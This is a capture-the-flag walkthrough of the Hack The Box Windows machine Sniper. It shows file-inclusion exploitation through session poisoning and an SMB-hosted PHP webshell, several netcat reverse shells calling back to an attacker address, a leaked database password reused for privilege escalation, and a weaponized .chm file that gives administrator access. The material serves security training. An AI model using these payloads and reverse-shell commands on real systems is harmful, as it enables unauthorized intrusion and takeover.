---
title: HTB: Sniper
url: https://0xdf.gitlab.io/2020/03/28/htb-sniper.html
date: 2020-03-28T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, ctf, htb-sniper, nmap, commando, gobuster, lfi, rfi, wireshark, samba, log-poisoning, powershell, webshell, powershell-run-as, chm, nishang, oscp-plus-v1, oscp-plus-v2
---

![Sniper](https://0xdfimages.gitlab.io/img/sniper-cover.png)

Sniper involved utilizing a relatively obvious file include vulnerability in a web page to get code execution and then a shell. The first privesc was a common credential reuse issue. The second involved poisoning a `.chm` file to get code execution as the administrator.

## Box Info

| Name | [Sniper](https://hackthebox.com/machines/sniper)  [Sniper](https://hackthebox.com/machines/sniper) [Play on HackTheBox](https://hackthebox.com/machines/sniper) |
| --- | --- |
| Release Date | [05 Oct 2019](https://twitter.com/hackthebox_eu/status/1179756963154018304) |
| Retire Date | 28 Mar 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Sniper |
| Radar Graph | Radar chart for Sniper |
| First Blood User | 01:48:08[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 02:22:10[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308)  [felamos felamos](https://app.hackthebox.com/users/27390) |

## Recon

Because it’s a Windows target, I started working from my Commando Windows VM.

### nmap

`nmap` shows HTTP (TCP 80), NetBios/SMB (TCP 135, 139, 445), and an RPC port (TCP 49667) open:

```

PS > nmap -p- --min-rate 10000 -oA scans\nmap-alltcp 10.10.10.151
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-06 19:51 GMT Daylight Time
Nmap scan report for 10.10.10.151
Host is up (0.024s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds

PS > nmap -p 80,135,139,445 -sV -sC -oA scans\nmap-tcpscripts 10.10.10.151
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-06 19:53 GMT Daylight Time
Nmap scan report for 10.10.10.151
Host is up (0.028s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h44m35s, deviation: 0s, median: 6h44m35s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-07 02:38:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.58 seconds

```

Based on the IIS version, it’s Windows 10 or Server 2016/2019.

### SMB - TCP 445

SMB without a username or password just gives access denied:

```

PS > net view 10.10.10.151
System error 5 has occurred.

Access is denied.

```

### Website - TCP 80

#### Site

The site is for Sniper Co., what looks to be a delivery company:

![1570442341790](https://0xdfimages.gitlab.io/img/1570442341790.png)

The first three links don’t lead anywhere. The “Our services” link points to `/blog/index.php`, and the “User Portal” link points to `/user/index.php`.

#### Directory Brute Force

`gobuster` doesn’t return anything I didn’t already find above:

```

PS > gobuster -u http://10.10.10.151 -w 'C:\Tools\dirbuster-lists\directory-list-lowercase-2.3-medium.txt' -x php -o scans\gobuster-root-php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.151/
[+] Threads      : 10
[+] Wordlist     : C:\Tools\dirbuster-lists\directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/10/07 01:37:34 Starting gobuster
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/blog (Status: 301)
/user (Status: 301)44 (0.04%)
/css (Status: 301)7644 (0.20%)
/js (Status: 301)07644 (0.44%)
=====================================================
2019/10/07 02:07:46 Finished
=====================================================

```

#### blog

The blog text is just a paragraph about fast delivery times and some *Lorem ipsum* dummy text. But there’s a bar at the top with options. Most of the links just point back to this page, but the language drop down has links to:
- `http://10.10.10.151/blog?lang=blog-en.php`
- `http://10.10.10.151/blog?lang=blog-es.php`
- `http://10.10.10.151/blog?lang=blog-fr.php`

The page is likely doing something like having each of the three language pages in the same directory, and then have PHP that includes it:

```

include $_GET['lang'];

```

If the filtering before that isn’t good, there could be a file inclusion vulnerability. I’ll poke at that in the next section.

#### user

`/user` redirects to `/user/login.php`:

![1570735029490](https://0xdfimages.gitlab.io/img/1570735029490.png)

I don’t have creds, but there’s a Sign Up link, which takes me to `/user/registration.php`:

![1570735071984](https://0xdfimages.gitlab.io/img/1570735071984.png)

When I create an account, I’m redirected to the login page. When I log in, there’s just an under construction page:

![1570735146595](https://0xdfimages.gitlab.io/img/1570735146595.png)

## Shell as iusr

### Enumeration

#### LFI

There is a local file include in the `lang` parameter. It doesn’t work when I try to include something with a relative path, like `..\index.php`:

![1570730149051](https://0xdfimages.gitlab.io/img/1570730149051.png)

But if I use an absolute path, like `\windows\win.ini`, the page loads, and I can see the file in the contents at the bottom if I look at the source:

```

</body>

</html>
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</body>
</html>	

```

#### RFI

There’s also remote file inclusion vulnerability here. HTTP includes seem to be turned off, likely in the `php.ini` file where `allow_url_include` could be off. But SMB includes do work (under the right circumstances). My understanding is that this was an unintended vulnerability by the box makers.

I originally started this box on Commando, but trying to get it to connect to my SMB share always resulted in `STATUS_ACCESS_DENIED` as I followed in Wireshark:

[![Wireshark SMB failure](https://0xdfimages.gitlab.io/img/1570730835112.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1570730835112.png)

That demonstrates that the server is willing to contact me, but I couldn’t get the authentication working (if you know how I can configure my SMB share to remove all auth, let me know).

On Kali, I tried `smbserver.py`, and again, Sniper connected to me, but failed to authenticate:

```

[*] Incoming connection (10.10.10.151,57159)
[*] AUTHENTICATE_MESSAGE (\,SNIPER)
[*] User \SNIPER authenticated successfully
[*] :::00::4141414141414141
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.151,57159)
[*] Remaining connections []

```

However, with Samba, I got it to work. I set `/etc/samba/smb.conf` to:

```

[SHARE]
path = /srv/samba/
browseable = yes
read only = no
create mask = 777
guest ok = yes
force user = nobody
force group = nogroup

```

The started the service:

```

root@kali# service smbd restart
root@kali# service nmbd restart

```

Permissions are important here. It’s important that the Samba process (running as nobody) can read the file:

```

root@kali# find srv/ -ls
  2359297      4 drwxr-xr-x   4 root     root         4096 srv/
  2359299      4 drwxrwxrwx   2 nobody   nogroup      4096 srv/samba
  2359300      4 -rwxrwxrwx   1 nobody   nogroup        35 srv/samba/cmd.php
  2359301     48 -rwxrwxrwx   1 root     root        45272 srv/samba/test.txt

```

`text.txt` is just a text file with the string `0xdf` in it. Now I can include it and see the results:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\10.10.14.6\share\test.txt' | sed -n '/<\/html>/,/<\/body>/p'
</html>
0xdf
</body>
</html>

```

### path 1 - LFI

#### RCE

Having found the LFI above, I start to think about where I could write a file on disk. One place is the PHP session file for the `/user/` site. The [default location on Windows](https://stackoverflow.com/questions/37603993/php-sessions-default-save-location-for-windows) is `C:\windows\temp\`. I get my session id from Burp, and see, it’s there:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\windows\temp\sess_8l44h398eccsi698nj5he5k2cr' | tail

</body>

</html>
username|s:4:"oxdf";</body>
</html>

```

Next I tried to register as:

```

<?php system("whoami") ?>

```

But when I tried to log in, I get rejected:

![1570739618691](https://0xdfimages.gitlab.io/img/1570739618691.png)

There must be some filtering going on at registration. After some playing around, I got this username to login:

```

a<?php echo `whoami` ?>b

```

And when I get the session, I can see the results:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\windows\temp\sess_8l44h398eccsi698nj5he5k2cr' | tail

</body>

</html>
username|s:24:"ant authority\iusr
b";</body>
</html>

```

I can now register the following to run a `dir` in the working directory:

```

a<?php echo `dir` ?>b

```

Returns (I’ll just show the part I care about, and cut out the surrounding html):

```

 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\inetpub\wwwroot\blog

04/11/2019  05:23 AM    <DIR>          .
04/11/2019  05:23 AM    <DIR>          ..
04/11/2019  05:28 AM             4,341 blog-en.php
04/11/2019  05:28 AM             4,487 blog-es.php
04/11/2019  05:28 AM             4,489 blog-fr.php
04/11/2019  05:23 AM    <DIR>          css
04/11/2019  05:25 AM             1,357 error.html
04/11/2019  05:25 AM             1,331 header.html
04/11/2019  08:31 PM               442 index.php
04/11/2019  05:23 AM    <DIR>          js
               6 File(s)         16,447 bytes
               4 Dir(s)  16,987,619,328 bytes free

```

#### Leak Source

I want to get the source for `registration.php` so I can understand the filters I’m trying to bypass. But when I try to change directories registering as a user with any characters like `..` and `\`, the login fails, presumably because of the filtering again.

I was able to fumble around enough to get this username registered and logged in:

```

a<?php echo `dir \\inetpub\\wwwroot\\user` ?>b

```

Now using the LFI returned:

```

 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\inetpub\wwwroot\user

10/01/2019  08:44 AM    <DIR>          .
10/01/2019  08:44 AM    <DIR>          ..
04/11/2019  05:15 PM               108 auth.php
04/11/2019  05:52 AM    <DIR>          css
04/11/2019  10:51 AM               337 db.php
04/11/2019  05:23 AM    <DIR>          fonts
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  06:18 AM             4,639 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  06:10 AM             6,463 login.php
04/08/2019  11:04 PM               148 logout.php
10/01/2019  08:42 AM             7,192 registration.php
08/14/2019  10:35 PM             7,004 registration_old123123123847.php
04/11/2019  05:23 AM    <DIR>          vendor
               7 File(s)         25,891 bytes
               7 Dir(s)  16,987,619,328 bytes free

```

I then tried to get the `registration.php` source, but it seems the `.` breaks things when I tried:

```

a<?php echo `type \\inetpub\\wwwroot\\user\\registration.php` ?>b

```

But, I know that `?` isn’t blocked, and that’s a single character wild card. So I register as:

```

a<?php echo `type \\inetpub\\wwwroot\\user\\registration?php` ?>b

```

Something about `?` wildcards are funky. I couldn’t get that to work. So eventually I registered:

```

a<?php echo `powershell cat \\inetpub\\wwwroot\\user\\registration*php` ?>b

```

I got the source for both files. Here’s `registration.php`:

```

<!DOCTYPE html>
<html>
<meta charset="utf-8">

</head>
<body>
<?php
require('db.php');                                                                                                                                                                                                                    
// If form submitted, insert values into the database.                                                                                                                                                                                
if (isset($_REQUEST['username'])){                                                                                                                                                                                                    
        // removes backslashes                           
        $username = stripslashes($_REQUEST['username']);                                                           
        $username = str_replace('-', '', $username);                                                               
        $username = str_replace('$', '', $username);                                                               
        $username = str_replace('[', '', $username);                                                               
        $username = str_replace('(', '', $username);                                                               
        $username = str_replace('_', '', $username);                                                               
        $username = str_replace('.', '', $username);                                                               
        $username = str_replace(';', '', $username);                                                               
        $username = str_replace('&', '', $username);                                                               
        $username = str_replace('"', '', $username);                                                               
        //escapes special characters in a string         
        $username = mysqli_real_escape_string($con,$username);                                                     
        $email = stripslashes($_REQUEST['email']);       
        $email = mysqli_real_escape_string($con,$email);                                                           
        $password = stripslashes($_REQUEST['password']);                                                           
        $password = mysqli_real_escape_string($con,$password);                                                     
        $trn_date = date("Y-m-d H:i:s");                 
        $query = "INSERT into `users` (username, password, email, trn_date)                                        
VALUES ('$username', '".md5($password)."', '$email', '$trn_date')";                                                
        $result = mysqli_query($con,$query);             
        if($result){                                     

sleep(1);                                                
header("Location: login.php");                           
   }                                                     
    }else{                                               
?>                                                       

<!DOCTYPE html>                                          
<html lang="en">                                         

<head>                                                   
        <title>Register</title>                          
        <meta charset="UTF-8">                           
        <meta name="viewport" content="width=device-width, initial-scale=1">                                       
<!--===============================================================================================-->                                                                                                                                
        <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>                                        
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">                      
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">                                                                                                                              
<!--===============================================================================================--> 
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">                                  
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">                    
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">                    
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">                              
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">                  
<!--===============================================================================================-->                                                                                                                                
        <link rel="stylesheet" type="text/css" href="css/util.css">                                                
        <link rel="stylesheet" type="text/css" href="css/main.css">                                                
<!--===============================================================================================-->                                                                                                                                
</head>                                                  
<body>                                                   

        <div class="limiter">                            
                <div class="container-login100">         
                        <div class="wrap-login100">                                                                
                                <form name="registration" action="" method="post" class="login100-form validate-form">                                                                                                                
                                        <span class="login100-form-title p-b-26">                                  
                                                Welcome                                                            
                                        </span>          
                                        <span class="login100-form-title p-b-48">                                  
                                                <i class="zmdi zmdi-account-add"></i>                              
                                        </span>          

                                        <div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">                                                                                                            
                                                <input type="email" name="email" class="input100" type="text" name="email">                                                                                                           
                                                <span class="focus-input100" data-placeholder="Email"></span>                                                                                                                         
                                        </div>           
                                                         
                                        <div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">                                                                                                            
                                                <input type="text" name="username" class="input100" type="text" name="email">                                                                                                         
                                                <span class="focus-input100" data-placeholder="Username"></span>                                                                                                                      
                                        </div>           

                                        <div class="wrap-input100 validate-input" data-validate="Enter password">                                                                                                                     
                                                <span class="btn-show-pass">                                       
                                                        <i class="zmdi zmdi-eye"></i>                              
                                                </span>                                                            
                                                <input type="password" name="password" class="input100" type="password" name="pass">                                                                                                  
                                                <span class="focus-input100" data-placeholder="Password"></span>                                                                                                                      
                                        </div>           

                                        <div class="container-login100-form-btn">                                  
                                                <div class="wrap-login100-form-btn">                               
                                                        <div class="login100-form-bgbtn"></div>                    
                                                        <button  type="submit" name="submit" class="login100-form-btn">                                                                                                               
                                                                Register                                           
                                                        </button>
                                                                                                        </div>                                                             
                                        </div>           

                                        <div class="text-center p-t-115">                                          
                                                <span class="txt1">                                                
                                                        Don't have an account?                                     
                                                </span>                                                            

                                                <a class="txt2" href="#">                                          
                                                        Sign Up                                                    
                                                </a>                                                               
                                        </div>           
                                </form>                  
                        </div>                           
                </div>                                   
        </div>                                           

        <div id="dropDownSelect1"></div>                 

<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/jquery/jquery-3.2.1.min.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                     
<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/animsition/js/animsition.min.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                
<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/bootstrap/js/popper.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                         
        <script src="vendor/bootstrap/js/bootstrap.min.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                  
<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/select2/select2.min.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                         
<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/daterangepicker/moment.min.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                  
        <script src="vendor/daterangepicker/daterangepicker.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                             
<!--===============================================================================================-->                                                                                                                                
        <script src="vendor/countdowntime/countdowntime.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                                                                                                                 
<!--===============================================================================================-->                                                                                                                                
        <script src="js/main.js" type="5614ef5d2b005421f12fe64f-text/javascript"></script>                         

        <?php } ?>                                       
</html> 

```

#### Shell

I can’t use and of: `-$[(_.;&"\`. I’ve already got PowerShell execution working through this:

```

<?php echo `powershell [command]` ?>     

```

I need a command I can put in that doesn’t use any of the banned characters.

Some of the things I tried that failed:
- Creating a UNC path to run off my SMB server using IPv6. It doesn’t work, because [IPv6s in UNC paths](https://en.wikipedia.org/wiki/IPv6_address#Literal_IPv6_addresses_in_UNC_path_names) have the `:` replaced by `-`.
- Finding and trying to poison `\programdata\data\sniper\users.ibd`, which is a backup of the users database. It has not only my username by the email address, which is less filtered. I had a lot of trouble getting this file to include, though I know of at least one person who was able to make this work.

This would all be easier if I could run a base64-encoded command. Typically I think of doing that by running `powershell -enc [base64-string]`. But it also works with `/enc`.

I’ll make the command, making sure to convert to 16-bit unicode characters with `iconv`:

```

root@kali# echo 'cmd /c "\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443"' | iconv -f ascii -t utf-16le | base64 -w0
YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA2AFwAcwBoAGEAcgBlAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAYwBtAGQAIAAxADAALgAxADAALgAxADQALgA2ACAANAA0ADMAIgAKAA==

```

Now, I’ll register as:

```

<?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA2AFwAcwBoAGEAcgBlAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAYwBtAGQAIAAxADAALgAxADAALgAxADQALgA2ACAANAA0ADMAIgAKAA==` ?>

```

Once I log in, I can include the session data:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\windows\temp\sess_8l44h398eccsi698nj5he5k2cr'

```

This just hangs, but I’ve got a shell on my listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.151.
Ncat: Connection from 10.10.10.151:49706.
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
whoami
nt authority\iusr

```

### path 2 - RFI

With the RFI identified earlier, I can include a simple PHP webshell, `cmd.php`:

```

<?php system($_REQUEST['cmd']); ?>

```

Now I can request that shell, and include a `cmd` parameter:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\10.10.14.6\share\cmd.php' --data-urlencode 'cmd=whoami' | sed -n '/<\/html>/,/<\/body>/p'                       
</html>
nt authority\iusr
</body>
</html>

```

To get a shell, I’ll just include a command to run `nc64.exe` from the same Samba share:

```

root@kali# curl -s -G 'http://10.10.10.151/blog/' --data-urlencode 'lang=\\10.10.14.6\share\cmd.php' --data-urlencode 'cmd=\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443'

```

And I get a callback:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.151.
Ncat: Connection from 10.10.10.151:57204.
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
whoami
nt authority\iusr

```

## Priv: iusr –> Chris

### Enumeration

Looking around, there are creds for the database in the PHP:

```

C:\inetpub\wwwroot\user>type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>

```

### Runas

I know the other user on the box is Chris from the `\users\` directory, so I’ll try to run as them using PowerShell. First I’ll open PowerShell:

```

C:\>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>

```

Now I can run as Chris, and it works:

```

PS C:\> hostname
Sniper
PS C:\> $user = "Sniper\Chris"
PS C:\> $pass = "36mEAhz/B8xQ~2VM"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
PS C:\> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
sniper\chris

```

This means the creds are good, and that Chris is in the “Remote Management Users” group, as I can verify:

```

PS C:\> net user chris
User name                    Chris
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/11/2019 6:53:37 AM
Password expires             Never
Password changeable          4/11/2019 6:53:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/10/2019 5:53:48 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

```

Now I can use that same PowerShell to get `user.txt`:

```

PS C:\inetpub\wwwroot\user> Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $cred -Computer localhost
21f4d0f2************************

```

### Shell

To turn that into a shell, chris can run `nc`:

```

PS C:\> Invoke-Command -ScriptBlock { \\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443 } -Credential $cred -Computer localhost

```

And get a callback on my listener (always using `rlwrap` for Windows):

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.151.
Ncat: Connection from 10.10.10.151:57201.
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>whoami
sniper\chris

```

## Priv: Chris –> Administrator

### Enumeration

In the root of the C drive there’s a folder `\docs` that iusr wasn’t able to access, but chris can. It contains several files:

```

C:\Docs>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Docs

10/09/2019  06:54 PM    <DIR>          .
10/09/2019  06:54 PM    <DIR>          ..
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,957,249,024 bytes free

```

`note.txt` talks about dropping documentation in this folder:

```

C:\Docs>type note.txt
type note.txt
Hi Chris,
  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

```

In Chris’ Downloads folder, there’s a `doc.chm`:

```

C:\Users\Chris\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM    <DIR>          .
04/11/2019  08:36 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)  17,685,372,928 bytes free

```

`.chm` files are Windows help files, so that could be the documentation that the CEO was talking about. I’ll copy this back to a Windows VM and check it out:

![image-20200327214532181](https://0xdfimages.gitlab.io/img/image-20200327214532181.png)

### Weaponize .chm

[Nishang](https://github.com/samratashok/nishang) has a tool, `Out-CHM`, which makes weaponized `.chm` files. I’ll load it into my PowerShell session:

```

PS > Import-Module .\Tools\nishang\Client\Out-CHM.ps1

```

Now I can call it. I’ll need to pass it the path the HTML Help Workshop (and I can [install it](https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138) if it’s not already installed), and it will write `doc.chm` in my current director. I’ll have it run `nc` out of an AppLocker safe directory:

```

PS > Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.6 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\Tools\nishang\doc.chm

Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics

Created c:\Tools\nishang\doc.chm, 13,458 bytes
Compression increased file by 266 bytes.

```

### Shell

Now I’ll move the result back to my Kali VM, into the Samba share, and then copy it over to Sniper:

```

C:\Docs>copy \\10.10.14.6\share\doc.chm .
        1 file(s) copied.

```

I’ll copy `nc64.exe` over as well:

```

C:\Docs>copy \\10.10.14.6\share\nc64.exe \windows\system32\spool\drivers\color\
        1 file(s) copied.  

```

In less than a minute:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.151.
Ncat: Connection from 10.10.10.151:57228.
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
sniper\administrator

```

And then I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
5624caf3************************

```

[Beyond Root »](/2020/04/09/htb-sniper-beyondroot.html)